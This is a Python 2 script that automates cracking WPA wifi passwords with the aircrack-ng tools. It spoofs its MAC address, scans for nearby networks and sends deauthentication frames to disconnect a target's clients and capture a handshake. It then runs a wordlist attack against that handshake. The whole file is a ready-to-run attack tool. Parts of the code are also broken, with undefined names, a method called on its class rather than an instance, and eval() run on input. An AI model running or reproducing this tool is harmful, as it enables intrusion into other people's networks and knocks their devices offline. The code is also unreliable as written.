#Cracks wifi passwords as ref.

import os
import csv
import time
import argparse
import threading
import subprocess
import random
from csv import reader
from subprocess import Popen, call
from os import devnull



class Generator(object):
 def __init__(self):
  self.post = 'ABCDEF0123456789'
  self.pre = [
               '00:aa:02',# Intel
               '00:13:49',# Zyxel
               '00:40:0b',# Cisco
               '00:1c:df',# Belkin
               '00:24:01',# D-link
               '00:e0:4c',# Realtek
               '00:e0:ed',# Silicom
               '00:0f:b5',# Netgear
               '00:27:19',# Tp-link
               '00:0A:F7',# Broadcom
             ]

 def getPrefix(self):
  shuffled = random.sample(self.pre,len(self.pre))
  return shuffled[random.randint(0,len(self.pre)-1)]

 def getPostfix(self):
  return self.post[random.randint(0,len(self.post)-1)]

 def generate(self):
  post = ['{}{}:'.format(self.getPostfix(),self.getPostfix()) for n in range(3)]
  post = ''.join(post)[:-1]
  return '{}:{}'.format(self.getPrefix(),post)


class Interface(object):
 def __init__(self,iface):
  self.wlan = iface
  self.devnull  = open(devnull,'w')
  self.mac = Generator.generate()

 def managedMode(self):
  self.destroyInterface()
  cmd = 'service network-manager restart'
  Popen(cmd,stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def changeMac(self):
  cmd ='ifconfig mon0 down && iwconfig mon0 mode monitor &&\
        macchanger -m {} mon0 && service\
        network-manager stop && ifconfig mon0 up'.format(self.mac)

  Popen(cmd,stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def monitorMode(self):
  self.destroyInterface()
  Popen('iw {} interface add mon0 type monitor'.format(self.wlan),
  stdout=self.devnull,stderr=self.devnull,shell=True).wait()
  self.changeMac()

 def destroyInterface(self):
  Popen('iw dev mon0 del',stdout=self.devnull,
  stderr=self.devnull,shell=True).wait()


class Accesspoints(object):
 def __init__(self,essid=None):
  self.essid = essid
  self.aps = {}
  self.mem = []
  self.map = []
  self.lst = []

 def open(self,csvfile):
  with open(csvfile,'r') as csvfile:
   self.csv = reader(csvfile,delimiter = ',')
   self.organize()
   self.setMap()
   self.display()

 def organize(self):
  for line in self.csv:
   # where router info is displayed
   if len(line) == 15:
    self.updateInfo(line)

   # where clients are displayed
   if len(line) == 7:
    self.setClient(line)

 def setClient(self,data):
  # assign
  bssid = data[5].strip()

  # filter
  if len(bssid) != 17 or not bssid in self.aps:
   return

  # update
  self.aps[bssid]['client'] = True

 def updateInfo(self,data):
  # assign
  bssid = data[0]
  chann = data[3]
  power = data[8]
  essid = data[13]

  # reassign
  power = power.strip()
  chann = chann.strip()
  essid = essid.strip()

  # check for existence
  if not bssid in self.aps:
   self.aps[bssid] = {}
   self.aps[bssid]['client'] = None

  # filter
  if not chann.isdigit() or eval(chann)==-1 or eval(power)==-1:
   del self.aps[bssid]
   return

  # change essid of hidden ap
  essid = essid if not '\\x00' in essid else 'HIDDEN'
  essid = essid if essid else 'UNKNOWN'

  # update
  ap = self.aps[bssid]
  ap['essid'] = essid
  ap['chann'] = chann
  ap['power'] = power

 def sort(self):
  self.mem = self.aps.keys()
  for a,alpha in enumerate(self.mem):
   for b,beta in enumerate(self.mem):
    if a==b:continue

    # set aps
    ap1 = self.aps[alpha]
    ap2 = self.aps[beta]

    # set power levels
    pw1 = ap1['power']
    pw2 = ap2['power']

    # sort
    if a>b and pw1<pw2:
     self.mem[a],self.mem[b]=self.mem[b],self.mem[a]

 def setMap(self):
  if self.aps:
   self.sort()

  if self.mem:
   del self.map[:]

  for num,mac in enumerate(self.mem):
   # assign
   try:
    ap = self.aps[mac]
   except KeyError:return
   power = ap['power']
   clnt = '*' if ap['client'] else '-'
   essid = ap['essid'] if not self.essid else self.essid if self.essid != mac\
   else ap['essid']

   power = ' {} '.format(power) if len(str(power)) == 1 else '{} '.format(power)\
   if len(str(power)) == 2 else power

   num = '{}   '.format(num) if len(str(num)) == 1 else '{}  '.format(num)\
   if len(str(num)) == 2 else '{} '.format(num) if len(str(num)) == 3 else num

   # first ouput
   if not eval(num):
    self.map.append('-------------------------------------------------------------')
    self.map.append('|| num  ||\t Bssid\t     ||  Power  || Client || Essid ||')
    self.map.append('-------------------------------------------------------------')
    self.map.append('-------------------------------------------------------------')
   self.map.append('|| {} || {} ||   {}   ||    {}   || {}'.format(num,mac,power,clnt,essid))
   if len(self.mem)-1 == eval(num):
    self.map.append('+-----------------------------------------------------------+')
  self.lst = [display for line in self.map for display in line]

 def display(self):
  if self.lst:
   call(['clear'])
   for line in self.map:
    print line


class Aircrack(object):
 def __init__(self,iface):
  self.devnull = open(os.devnull,'w')
  self.iface = iface
  self.wait = None
  self.run = True
  self.atk = None
  self.out = 'data-01.out'
  self.csv = 'data-01.csv'
  self.cap = 'data-01.cap'
  self.ap  = accesspoints()
  self.iw  = interface(self.iface)

 def load(self,ssid=None):
  # scanning ...
  self.ap = accesspoints()
  while not self.ap.aps and self.run:
   for n in range(4):
    time.sleep(.4)
    if self.ap.aps:break
    subprocess.call(['clear'])
    if not ssid:
     print 'Scanning {}'.format(n*'.')
    else:
     print 'Searching for: {} {}'.format(ssid,n*'.')

 def scan(self):
  cmd = ['airodump-ng','-a','-w','data','--output-format','csv',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)

 def kill(self):
  # kill processes
  for proc in ['airodump-ng','aireplay-ng','aircrack-ng']:
   subprocess.Popen(['pkill',proc]).wait()

 def remove(self):
  for f in os.listdir('.'):
   if f.startswith('data'):
    os.remove(f)

 def target(self,mac,chann):
  self.kill()
  self.remove()
  self.ap.aps = {}
  self.ap.mem = []
  cmd = ['airodump-ng','-a','--bssid',mac,'-c',chann,'-w','data','--output-format','cap,csv',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)
  time.sleep(1.5)

 def startScan(self):
  self.kill()
  self.remove()
  self.iw.monitorMode()
  self.iface = 'mon0'
  threading.Thread(target=self.load).start()
  self.scan()

 def stopScan(self):
  self.kill()

 def display(self):
  if os.path.exists(self.csv):
   self.ap.open(self.csv)

 def search(self,mac):
  if os.path.exists(self.csv):
   with open(self.csv,'r') as csvfile:
    csvfile = csv.reader(csvfile,delimiter=',')
    lines = [line for line in csvfile]
    num = [num for num,line in enumerate(lines) if len(line)==15 if line[0]==mac]
    return lines[num[0]][3] if num else None

 def updateChannel(self,mac):
  try:
   ap = self.ap.aps[mac]
  except KeyError:return
  essid=ap['essid']
  self.kill()
  self.remove()
  threading.Thread(target=self.load,args=[essid]).start()
  cmd = ['airodump-ng','-w','data','--output-format','csv','-a',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)
  while 1:
   chann = self.search(mac)
   if chann:
    ap['chann'] = chann.strip()
    break

 def aircrack(self,mac,passlist):
  os.chdir(base) # change directory back
  self.exit(False)
  self.iw.managedMode()

  capFile = '/tmp/{}'.format(self.cap)
  cmd = ['aircrack-ng',capFile,'-w',passlist]
  subprocess.call(['clear'])

  # start aircrack
  try:
   subprocess.Popen(cmd).wait()
  except KeyboardInterrupt:
   self.exit()

 def attack(self,mac):
  cmd=['aireplay-ng','-0','1','-a',mac,'--ignore-negative-one',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull).wait()
  time.sleep(1.3)

 def readCap(self):
  if os.path.exists(self.cap):
   log = open(self.out,'w')
   cmd = ['aircrack-ng',self.cap]
   subprocess.Popen(cmd,stdout=log,stderr=log).wait()

 def readLog(self):
  if not os.path.exists(self.out):return
  with open(self.out) as aircrackOutput:
   try:
    line = [line for line in aircrackOutput if '(1' in line.split()]
   except IndexError:return
   try:
    if line:
     self.wait = False
   except NameError:return

 def handshake(self):
  while self.wait:
   self.display()
   time.sleep(.1)
   if self.ap.aps.keys() and not self.atk:
    threading.Thread(target=self.listen).start()

 def listen(self):
  # there's only one ap in dict
  mac = self.ap.aps.keys()[0]
  ap  = self.ap.aps[mac]

  # are there nay clients
  if ap['client']:
   self.atk = True
   [self.attack(mac) for n in range(3)]
   time.sleep(10)
   self.readCap()
   self.readLog()
   self.atk = False

 def exitMsg(self):
  while self.run:
   for n in range(4):
    subprocess.call(['clear'])
    print 'Exiting {}'.format(n*'.')
    time.sleep(.4)
  subprocess.call(['clear'])

 def exit(self,kill=True):
  self.wait = False
  self.run = False
  self.kill()
  self.remove()
  time.sleep(1.8)
  if kill:
   self.run = True
   threading.Thread(target=self.exitMsg).start()
  try:
   self.iw.managedMode()
  finally:
   self.run = False
  if kill:
   exit()

def main():
 # assign arugments
 args = argparse.ArgumentParser()
 args.add_argument('wordlist',help='wordlist')
 args.add_argument('interface',help='wireless interface')
 args = args.parse_args()

 # assign variables
 iface = args.interface
 engine = Aircrack(iface)
 wordlist = args.wordlist

 # validate wordlist
 if not os.path.exists(wordlist):
  exit('Error: unable to locate \'{}\''.format(wordlist))

 # change directory
 os.chdir('/tmp')

 # start scanning
 engine.startScan()

 # display
 while 1:
  try:engine.display();time.sleep(.5)
  except KeyboardInterrupt:
   if not engine.ap.aps:
    engine.run = False
   else:
    engine.stopScan()
   break

 # no accesspoints found
 if not engine.ap.aps:
  engine.exit()

 try:
  num = raw_input('\nEnter num: ')
  num = eval(num)
 except KeyboardInterrupt:
  engine.exit()

 mac = engine.ap.mem[num]
 chann = engine.ap.aps[mac]['chann']
 essid = engine.ap.aps[mac]['essid']
 essid = essid if essid != 'HIDDEN' and essid != 'UNKNOWN' else mac

 # display scanning
 threading.Thread(target=engine.load,args=[essid]).start()

 # wait for handshake
 while 1:
  try:
   engine.wait = True # wait for handshake
   engine.target(mac,chann) # scan the target
   threading.Thread(target=engine.handshake).start() # look for handshake

   # scan for 60 seconds before updating channel
   for t in range(60):
    time.sleep(1)
    if not engine.wait:
     break

   # check if we capture a handshake
   engine.wait = False if engine.wait else None
   if engine.wait == None:break

   # obtain info
   engine.updateChannel(mac)
  except KeyboardInterrupt:
   engine.exit()

 # start dictionary attack
 engine.aircrack(mac,wordlist)

if __name__ == '__main__':
 base = os.getcwd()
 [exit('root access required') if os.getuid() else main()]
